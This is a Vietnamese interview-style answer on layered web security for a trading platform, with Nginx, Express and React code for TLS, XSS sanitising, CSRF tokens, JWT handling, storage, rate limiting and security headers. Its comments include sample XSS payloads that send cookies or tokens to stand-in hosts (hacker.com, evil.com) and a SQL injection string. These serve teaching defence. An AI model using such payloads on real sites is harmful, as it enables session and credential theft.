# 🔐 Q51: Bảo Mật Security trên Web Application

**❓ Tình Huống:**

Bạn là Senior Frontend Developer phụ trách security cho Trading Platform xử lý:

- **Sensitive Data**: User credentials, trading orders, financial transactions
- **API Calls**: 1000+ requests/minute đến backend APIs
- **User Input**: Form submissions, search queries, comments
- **Third-party Integration**: Payment gateways, analytics, CDN

**Threats (Mối đe dọa):**

- XSS attacks (inject malicious scripts)
- CSRF attacks (force unwanted actions)
- Man-in-the-Middle (intercept data)
- Session hijacking
- Data exposure in client-side code

**Yêu cầu:** Thiết kế và implement chiến lược bảo mật toàn diện (defense in depth).

**✅ Đáp Án Chi Tiết:**

**🛡️ 7 Tầng Bảo Mật (7-Layer Security Strategy):**

```
┌──────────────────────────────────────────────────────────────┐
│              WEB SECURITY LAYERS                              │
├──────────────────────────────────────────────────────────────┤
│  1️⃣ HTTPS + TLS (Transport Layer Security)                  │
│  2️⃣ XSS Prevention (Cross-Site Scripting)                   │
│  3️⃣ CSRF Protection (Cross-Site Request Forgery)            │
│  4️⃣ Authentication & Authorization                          │
│  5️⃣ Secure Storage                                          │
│  6️⃣ API Security                                            │
│  7️⃣ Security Headers                                        │
└──────────────────────────────────────────────────────────────┘
```

**Code Example (TypeScript + React):**

```typescript
// ============================================
// 1️⃣ HTTPS + TLS (BẢO MẬT TẦNG TRUYỀN TẢI)
// ============================================

// Giải thích: HTTPS mã hóa dữ liệu giữa browser ↔ server
// Ngăn Man-in-the-Middle attack (hacker không đọc được data)

// Cấu hình Nginx Server
server {
  listen 443 ssl http2;  // Port 443 = HTTPS, http2 = protocol mới nhanh hơn

  # HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
  # Giải thích: Browser tự động chuyển HTTP → HTTPS trong 1 năm
  # includeSubDomains: Áp dụng cho tất cả subdomain (api.example.com, cdn.example.com)
  # preload: Đưa vào HSTS preload list của browser (bảo mật từ lần truy cập đầu)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  # Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
  ssl_certificate /path/to/cert.pem;          # Public certificate (chứng chỉ công khai)
  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)

  # Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
  # Không dùng TLS 1.0, 1.1 (đã lỗi thời, có lỗ hổng)
  ssl_protocols TLSv1.2 TLSv1.3;

  # Cipher suite: Thuật toán mã hóa
  # HIGH = mã hóa mạnh, !aNULL = không dùng cipher không xác thực, !MD5 = không dùng MD5 (yếu)
  ssl_ciphers HIGH:!aNULL:!MD5;
}

// ============================================
// 2️⃣ XSS PREVENTION (NGĂN CHẶN TẤN CÔNG XSS)
// ============================================

// Giải thích XSS (Cross-Site Scripting):
// Hacker inject malicious script vào web → script chạy → steal cookies, redirect, keylog
// VD: User nhập comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// 🛡️ A. Input Sanitization (Làm Sạch Input) với DOMPurify
import DOMPurify from 'dompurify';
import { useState, useMemo } from 'react';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Sanitize input: Loại bỏ script tags và các thẻ nguy hiểm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Chỉ cho phép các thẻ an toàn
      ALLOWED_ATTR: ['href']  // Chỉ cho phép attribute 'href' (cho thẻ <a>)
    });
    // Kết quả: "<script>alert('xss')</script>" → "" (bị xóa)
    //          "<b>Text</b>" → "<b>Text</b>" (giữ lại)

    onSubmit(sanitized);
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Nhập comment của bạn..."
      />
      <button type="submit">Gửi Comment</button>
    </form>
  );
}

// ✅ Safe Display: Hiển thị HTML an toàn
function SafeComment({ content }) {
  // useMemo: Chỉ sanitize lại khi content thay đổi
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho phép format text cơ bản
      ALLOWED_ATTR: ['href', 'target'],  // Cho phép link
      ALLOW_DATA_ATTR: false  // Không cho phép data-* attributes (có thể chứa script)
    });
  }, [content]);

  // dangerouslySetInnerHTML: Render HTML string
  // Tên "dangerous" nhắc nhở phải sanitize trước khi dùng
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ❌ VÍ DỤ TẤN CÔNG XSS:
// User nhập: <img src="x" onerror="alert('XSS')">
// Không sanitize → img load lỗi → chạy onerror → alert hiện
// Có sanitize → DOMPurify xóa onerror attribute → an toàn

// 🛡️ B. Content Security Policy (CSP) - Chính sách bảo mật nội dung
// CSP: Header chỉ định nguồn nào được phép load scripts, styles, images
// Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // Mặc định chỉ load từ cùng domain
      "script-src 'self' https://trusted-cdn.com",  // Script chỉ từ domain + CDN tin cậy
      "style-src 'self' 'unsafe-inline'",  // CSS từ domain + inline styles (cần cho React)
      "img-src 'self' data: https:",  // Image từ domain + data URLs + HTTPS
      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket chỉ đến API
      "frame-ancestors 'none'"  // Không cho embed trong iframe (chống clickjacking)
    ].join('; ')
  );
  next();
});
// Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
// → Browser BLOCK vì evil.com không trong whitelist → XSS thất bại

// ============================================
// 3️⃣ CSRF PROTECTION (NGĂN CHẶN TẤN CÔNG CSRF)
// ============================================

// Giải thích CSRF (Cross-Site Request Forgery):
// Hacker lừa user click link → browser tự động gửi request (kèm cookies) → thực hiện action không mong muốn
// VD: User đang login bank.com → click link evil.com → evil.com trigger POST /transfer → tiền bị chuyển

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

// SERVER: Generate CSRF Token
// Tạo token ngẫu nhiên cho mỗi session, lưu ở server
app.get('/api/csrf-token', (req, res) => {
  // Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
  const token = randomBytes(32).toString('hex');

  // Lưu token vào session (server-side, hacker không access được)
  req.session.csrfToken = token;

  // Trả token cho client
  res.json({ csrfToken: token });
});

// API endpoint cần bảo vệ
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // ✅ Verify CSRF token: So sánh token từ client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    console.log('❌ CSRF token không hợp lệ');
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Token hợp lệ → xử lý transfer
  console.log(`✅ Chuyển $${amount} đến ${toAccount}`);
  // Process transfer logic...
  res.json({ success: true });
});

// CLIENT: Hook lấy CSRF token
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Fetch token từ server khi component mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
      .catch(err => console.error('Lỗi lấy CSRF token:', err));
  }, []);

  return csrfToken;
}

// Component Form chuyển tiền
function TransferForm() {
  const csrfToken = useCsrfToken();  // Lấy token
  const [amount, setAmount] = useState('');
  const [toAccount, setToAccount] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Gửi CSRF token cùng request
    // Cách 1: Trong body
    // Cách 2: Trong custom header (X-CSRF-Token)
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken  // Gửi token qua header
      },
      body: JSON.stringify({
        amount,
        toAccount,
        csrfToken  // Cũng gửi trong body (double check)
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Số tiền"
      />
      <input
        type="text"
        value={toAccount}
        onChange={(e) => setToAccount(e.target.value)}
        placeholder="Tài khoản nhận"
      />
      <button type="submit">Chuyển Tiền</button>
    </form>
  );
}

// TẠI SAO CSRF TOKEN HOẠT ĐỘNG?
// 1. Site evil.com KHÔNG thể đọc token từ bank.com (Same-Origin Policy)
// 2. Browser tự động gửi cookies → nhưng KHÔNG tự động gửi custom headers/body
// 3. Request từ evil.com thiếu token → server reject → CSRF thất bại

// ============================================
// 4️⃣ AUTHENTICATION & AUTHORIZATION (XÁC THỰC & PHÂN QUYỀN)
// ============================================

// Giải thích JWT (JSON Web Token):
// Token chứa thông tin user (id, email, role) được mã hóa
// Server ký token bằng secret key → client không thể fake token
// 2 loại token: Access Token (ngắn hạn) + Refresh Token (dài hạn)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

// SERVER: Login API
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // Tìm user trong database
  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: 'Email không tồn tại' });
  }

  // Verify password (so sánh với hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);

  if (!validPassword) {
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
  }

  // ✅ Generate Access Token (Token truy cập - ngắn hạn: 15 phút)
  // Tại sao ngắn hạn? Nếu bị đánh cắp → hacker chỉ dùng được 15 phút
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // Payload: thông tin user
    process.env.JWT_SECRET!,  // Secret key để ký token (giữ bí mật)
    { expiresIn: '15m' }  // Token hết hạn sau 15 phút
  );

  // ✅ Generate Refresh Token (Token làm mới - dài hạn: 7 ngày)
  // Dùng để lấy access token mới khi access token hết hạn
  const refreshToken = jwt.sign(
    { userId: user.id },  // Payload đơn giản hơn
    process.env.REFRESH_TOKEN_SECRET!,  // Secret key khác với access token
    { expiresIn: '7d' }  // 7 ngày
  );

  // ✅ Lưu refresh token vào httpOnly cookie
  // httpOnly: JavaScript KHÔNG đọc được → XSS không steal được
  // secure: Chỉ gửi qua HTTPS
  // sameSite: 'strict' → chống CSRF (cookie không gửi từ site khác)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JS không access được (chống XSS)
    secure: true,    // Chỉ gửi qua HTTPS
    sameSite: 'strict',  // Chống CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày (milliseconds)
  });

  // Trả access token cho client (lưu trong memory, KHÔNG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
});

// API làm mới access token
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Không có refresh token' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);

    // Generate access token mới
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(403).json({ error: 'Refresh token không hợp lệ' });
  }
});

// CLIENT: Auth Context với auto-refresh
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // ✅ Auto-refresh token trước khi hết hạn
  // Access token hết hạn sau 15 phút → refresh sau 14 phút (dư 1 phút buffer)
  useEffect(() => {
    const refreshInterval = setInterval(async () => {
      console.log('Đang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'  // Gửi cookies (chứa refresh token)
      });

      if (res.ok) {
        const data = await res.json();
        setAccessToken(data.accessToken);  // Update access token mới
        console.log('✅ Access token đã được làm mới');
      } else {
        console.log('❌ Refresh thất bại → User cần login lại');
        setAccessToken(null);
      }
    }, 14 * 60 * 1000); // 14 phút = 840,000ms

    // Cleanup interval khi unmount
    return () => clearInterval(refreshInterval);
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

// Hook sử dụng auth
export const useAuth = () => useContext(AuthContext);

// Component gọi API với authentication
function UserProfile() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (accessToken) {
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}`  // Gửi access token trong header
        }
      })
        .then(res => res.json())
        .then(data => setProfile(data));
    }
  }, [accessToken]);

  return <div>Thông tin user: {profile?.email}</div>;
}

// ============================================
// 5️⃣ SECURE STORAGE (LƯU TRỮ AN TOÀN)
// ============================================

// Nguyên tắc: KHÔNG BAO GIỜ lưu sensitive data ở client-side (localStorage/sessionStorage)
// Lý do: XSS attack có thể đọc localStorage → steal tokens, passwords, credit cards

// ❌ CÁCH LƯU KHÔNG AN TOÀN
// localStorage/sessionStorage: JavaScript có thể đọc → XSS steal được
localStorage.setItem('token', accessToken); // ❌ XSS đọc được!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // ❌ KHÔNG BAO GIỜ làm!
localStorage.setItem('password', 'user123'); // ❌ Cực kỳ nguy hiểm!

// Kịch bản tấn công:
// 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script chạy → đọc localStorage → gửi token về server hacker
// 3. Hacker dùng token → truy cập account của user

// ✅ CÁCH LƯU AN TOÀN

// 1. HttpOnly Cookies cho Refresh Token (bảo mật nhất)
// httpOnly: JavaScript KHÔNG thể đọc → XSS không steal được
// Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // ✅ JS không access được
  secure: true,      // ✅ Chỉ gửi qua HTTPS
  sameSite: 'strict', // ✅ Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày
});

// Client không thể đọc cookie này:
console.log(document.cookie); // Không thấy refreshToken (vì httpOnly)

// 2. Memory-only cho Access Token (lưu trong React state/context)
// Access token chỉ tồn tại trong memory → mất khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Khi login thành công
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setAccessToken(data.accessToken); // ✅ Lưu trong memory (React state)
    // KHÔNG lưu vào localStorage
  };

  return <div>App content...</div>;
}

// 3. Session Storage (tốt hơn localStorage nhưng vẫn có risk)
// sessionStorage: Tồn tại trong 1 tab, mất khi đóng tab
// Vẫn có thể bị XSS steal → chỉ dùng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // ✅ OK cho data không nhạy cảm
sessionStorage.setItem('language', 'vi'); // ✅ OK

// ❌ KHÔNG dùng cho sensitive data
sessionStorage.setItem('token', token); // ❌ Vẫn có XSS risk

// 4. Encrypted Storage (Mã hóa trước khi lưu - fallback option)
// Chỉ dùng khi BẮT BUỘC phải lưu client-side
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'your-encryption-key'; // Lấy từ env hoặc server

// Encrypt trước khi lưu
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

// Decrypt khi đọc
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// Lưu data đã mã hóa
const encrypted = encryptData(sensitiveData);
localStorage.setItem('data', encrypted);

// Đọc và giải mã
const encrypted = localStorage.getItem('data');
const decrypted = decryptData(encrypted);

// ⚠️ LƯU Ý: Encryption KHÔNG an toàn 100%
// - Secret key vẫn ở client → hacker có thể tìm thấy
// - Chỉ làm khó hacker hơn, KHÔNG ngăn được hoàn toàn

// 📋 BẢNG SO SÁNH STORAGE OPTIONS
/*
┌──────────────────────┬─────────────┬─────────────┬──────────────────┐
│ Storage Type         │ XSS Risk    │ CSRF Risk   │ Best Use Case    │
├──────────────────────┼─────────────┼─────────────┼──────────────────┤
│ HttpOnly Cookie      │ ✅ Low      │ ⚠️ Medium   │ Refresh Token    │
│ Memory (React State) │ ✅ Low      │ ✅ Low      │ Access Token     │
│ localStorage         │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ sessionStorage       │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ Encrypted Storage    │ ⚠️ Medium   │ ✅ Low      │ Fallback only    │
└──────────────────────┴─────────────┴─────────────┴──────────────────┘
*/

// ✅ BEST PRACTICE:
// - Refresh Token → httpOnly cookie (server-side)
// - Access Token → React state/Context (memory)
// - User preferences → localStorage (non-sensitive)
// - NEVER store passwords, credit cards, API keys trong client

// ============================================
// 6️⃣ API SECURITY (BẢO MẬT API)
// ============================================

// 🛡️ A. Rate Limiting (Giới Hạn Số Request)
// Mục đích: Ngăn DDoS attack, brute-force attack, spam
// VD: Hacker thử 1 triệu passwords → rate limit chặn sau 5 lần thử

const rateLimit = require('express-rate-limit');

// Rate limiter cho toàn bộ API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Cửa sổ thời gian: 15 phút
  max: 100, // Tối đa 100 requests trong 15 phút (từ 1 IP)
  message: 'Quá nhiều requests, vui lòng thử lại sau',
  standardHeaders: true, // Trả về RateLimit headers (X-RateLimit-*)
  legacyHeaders: false,  // Tắt headers cũ
});

// Áp dụng cho tất cả API routes
app.use('/api/', apiLimiter);

// Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử login trong 15 phút
  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút',
  skipSuccessfulRequests: true // Không đếm request thành công
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic...
});

// 🛡️ B. Input Validation (Kiểm Tra Dữ Liệu Đầu Vào)
// Nguyên tắc: KHÔNG BAO GIỜ tin tưởng input từ client
// Luôn validate ở server-side (client validation có thể bị bypass)

import { z } from 'zod'; // Thư viện validation mạnh mẽ

// Schema cho transfer request
const transferSchema = z.object({
  amount: z.number()
    .positive('Số tiền phải > 0')  // Phải là số dương
    .max(1000000, 'Số tiền tối đa 1 triệu'),  // Giới hạn trên

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // Đúng format

  description: z.string()
    .max(200, 'Mô tả tối đa 200 ký tự')
    .optional()  // Field không bắt buộc
});

// API endpoint với validation
app.post('/api/transfer', async (req, res) => {
  try {
    // ✅ Validate input với Zod
    const data = transferSchema.parse(req.body);

    // Validation pass → data đã clean và đúng type
    console.log('✅ Data hợp lệ:', data);

    // Xử lý transfer với data đã validate
    const result = await processTransfer(data);

    res.json({ success: true, result });

  } catch (error) {
    // Validation fail → trả lỗi chi tiết
    if (error instanceof z.ZodError) {
      console.log('❌ Validation errors:', error.errors);
      return res.status(400).json({
        error: 'Dữ liệu không hợp lệ',
        details: error.errors
      });
    }

    res.status(500).json({ error: 'Lỗi server' });
  }
});

// 🛡️ C. CORS Configuration (Kiểm Soát Nguồn Gốc Requests)
// CORS: Quy định domain nào được phép call API
import cors from 'cors';

// CORS config nghiêm ngặt
const corsOptions = {
  origin: [
    'https://yourdomain.com',      // Production domain
    'https://staging.yourdomain.com', // Staging
  ],
  // KHÔNG dùng origin: '*' trong production (cho phép mọi domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho phép

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho phép

  credentials: true, // Cho phép gửi cookies

  maxAge: 86400 // Cache preflight request 24h
};

app.use(cors(corsOptions));

// 🛡️ D. SQL Injection Prevention (Ngăn Chặn SQL Injection)
// LUÔN dùng parameterized queries, KHÔNG nối string SQL

// ❌ KHÔNG AN TOÀN: String concatenation
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`; // XSS: userId = "1 OR 1=1"
db.query(query); // ❌ Trả về tất cả users!

// ✅ AN TOÀN: Parameterized query
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?'; // Placeholder
db.query(query, [userId]); // ✅ Library tự động escape

// 🛡️ E. API Authentication (Xác Thực API)
// Middleware kiểm tra token
const authenticateToken = (req, res, next) => {
  // Lấy token từ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: 'Thiếu access token' });
  }

  try {
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded; // Gắn user info vào request
    next(); // Token hợp lệ → tiếp tục
  } catch (error) {
    return res.status(403).json({ error: 'Token không hợp lệ hoặc hết hạn' });
  }
};

// Áp dụng middleware cho protected routes
app.get('/api/profile', authenticateToken, (req, res) => {
  // req.user đã có thông tin từ token
  res.json({ user: req.user });
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
  // Multiple layers: Authentication + Rate limiting + Validation
  // ...
});

// ============================================
// 7️⃣ SECURITY HEADERS (HEADERS BẢO MẬT)
// ============================================

// Security Headers: HTTP response headers tăng cường bảo mật
// Helmet.js: Thư viện tự động set các security headers

import helmet from 'helmet';
import express from 'express';

const app = express();

// Áp dụng Helmet với config chi tiết
app.use(helmet({

  // 1. Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // Mặc định chỉ load từ cùng origin

      scriptSrc: [
        "'self'",  // Scripts từ cùng domain
        "'unsafe-inline'",  // Cho phép inline scripts (cần cho React)
        "https://trusted-cdn.com"  // CDN tin cậy
      ],

      styleSrc: [
        "'self'",
        "'unsafe-inline'"  // Inline styles (cần cho styled-components)
      ],

      imgSrc: [
        "'self'",  // Images từ domain
        "data:",   // Data URLs (base64 images)
        "https:"   // HTTPS images
      ],

      connectSrc: [
        "'self'",  // Fetch/WebSocket từ domain
        "https://api.example.com"  // API endpoints
      ],

      fontSrc: ["'self'", "https://fonts.gstatic.com"],

      objectSrc: ["'none'"],  // Không cho phép <object>, <embed>

      mediaSrc: ["'self'"],  // Video/Audio

      frameSrc: ["'none'"]  // Không cho phép iframe
    }
  },

  // 2. X-Frame-Options - Chống Clickjacking
  // Clickjacking: Hacker nhúng site vào iframe, lừa user click vào button ẩn
  xFrameOptions: {
    action: 'deny'  // Không cho phép site được nhúng trong iframe
  },
  // Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)

  // 3. X-Content-Type-Options - Chống MIME type sniffing
  // noSniff: true → Browser không đoán MIME type, phải dùng đúng Content-Type
  noSniff: true,
  // VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript

  // 4. Referrer-Policy - Kiểm soát thông tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // Không gửi referrer header (giấu nguồn gốc request)
  },
  // Các option khác: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'

  // 5. X-XSS-Protection (Legacy, CSP tốt hơn)
  xssFilter: true,  // Enable XSS filter built-in của browser

  // 6. Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 năm (giây)
    includeSubDomains: true,  // Áp dụng cho subdomain
    preload: true  // Đưa vào HSTS preload list
  }

}));

// Hoặc set headers thủ công
app.use((req, res, next) => {
  // CSP Header
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

  // X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

  // X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (tắt features không dùng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // Tắt location, mic, camera
  );

  next();
});

// 📋 BẢNG TÓM TẮT SECURITY HEADERS
/*
┌────────────────────────────┬──────────────────────────────────────────┐
│ Header                     │ Mục Đích                                 │
├────────────────────────────┼──────────────────────────────────────────┤
│ Content-Security-Policy    │ Kiểm soát nguồn scripts, styles, images  │
│ X-Frame-Options            │ Chống Clickjacking (iframe embed)        │
│ X-Content-Type-Options     │ Chống MIME type sniffing                 │
│ Referrer-Policy            │ Kiểm soát thông tin referrer             │
│ Strict-Transport-Security  │ Bắt buộc HTTPS                           │
│ X-XSS-Protection           │ Enable browser XSS filter (legacy)       │
│ Permissions-Policy         │ Tắt browser features không dùng          │
└────────────────────────────┴──────────────────────────────────────────┘
*/

// ✅ Kiểm tra headers:
// 1. Mở DevTools → Network tab
// 2. Chọn request bất kỳ
// 3. Xem Response Headers
// 4. Hoặc dùng https://securityheaders.com để scan

// VÍ DỤ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/
```

**🎯 Security Checklist:**

```typescript
// ✅ Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};
```

**Best Practices:**

1. **Defense in Depth**: Multiple layers of security
2. **Principle of Least Privilege**: Minimal permissions
3. **Input Validation**: Server-side validation always
4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
5. **Regular Updates**: Dependencies, libraries, frameworks
6. **Security Audits**: Penetration testing, code reviews
7. **Monitoring**: Log security events, detect anomalies

**Common Mistakes (Lỗi Bảo Mật Thường Gặp):**

```typescript
// ❌ LỖI 1: Lưu tokens trong localStorage
// Vấn đề: XSS có thể đọc localStorage → steal token
localStorage.setItem('token', token); // ❌ Nguy hiểm!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!

// ✅ CÁCH SỬA: Dùng HttpOnly cookies
// Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // JavaScript không đọc được
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Chống CSRF
});
// Client: Không cần làm gì, browser tự động gửi cookie

// ❌ LỖI 2: Không sanitize user input
// Vấn đề: User nhập <script>alert('XSS')</script> → script chạy
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ❌ Nguy hiểm!
}

// ✅ CÁCH SỬA: Dùng DOMPurify sanitize
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Chỉ cho phép tags an toàn
    ALLOWED_ATTR: [], // Không cho phép attributes
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ✅ An toàn
}

// ❌ LỖI 3: Không có CSRF protection
// Vấn đề: Hacker lừa user click link → browser gửi request kèm cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // ❌ Thiếu CSRF token

// ✅ CÁCH SỬA: Gửi CSRF token
// 1. Lấy token từ server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());

// 2. Gửi token cùng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // ✅ Gửi token
  },
  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
});

// ❌ LỖI 4: Password yếu
// Vấn đề: Password ngắn → dễ brute-force
const isValid = password.length >= 6; // ❌ Quá yếu (123456, password)

// ✅ CÁCH SỬA: Password policy mạnh
// Regex: Ít nhất 12 ký tự, có chữ thường, chữ hoa, số, ký tự đặc biệt
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password phải có ít nhất 12 ký tự, bao gồm chữ hoa, chữ thường, số và ký tự đặc biệt'
    );
  }
  return true;
}

// VD: "Pass123!" → ❌ Fail (chỉ 8 ký tự)
//     "MySecurePass123!" → ✅ Pass

// ❌ LỖI 5: Không có rate limiting
// Vấn đề: Hacker thử 1 triệu passwords trong vài phút
app.post('/api/login', async (req, res) => {
  // ❌ Không giới hạn → brute-force dễ dàng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ✅ CÁCH SỬA: Thêm rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử
  message: 'Quá nhiều lần thử login, vui lòng thử lại sau 15 phút',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // ✅ Giới hạn 5 lần/15 phút → brute-force khó hơn
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ❌ LỖI 6: Hardcode secrets trong code
// Vấn đề: Secret bị lộ khi push lên GitHub
const JWT_SECRET = 'my-secret-key-123'; // ❌ Nguy hiểm!
const API_KEY = 'sk_live_abc123xyz'; // ❌ Lộ API key

